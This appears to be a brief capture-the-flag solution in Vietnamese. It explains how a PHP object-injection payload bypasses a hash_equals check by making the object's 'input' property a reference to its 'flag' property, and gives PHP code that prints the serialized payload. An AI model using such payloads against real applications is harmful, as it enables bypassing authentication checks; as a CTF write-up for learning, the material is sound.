# Solution

Điểm đặc biệt ở đây là thay vì so sánh `$unserialized_obj->input` với `$flag` thì server lại dùng:
`hash_equals ($unserialized_obj->input, $unserialized_obj->flag)`

=> ta có thể dùng tham chiếu để làm cho `-> input` trở tới flag


```php
<?php

$flag = "ccccc";

$obj = new stdClass;
$obj->input = &$obj->flag;

echo serialize($obj);
```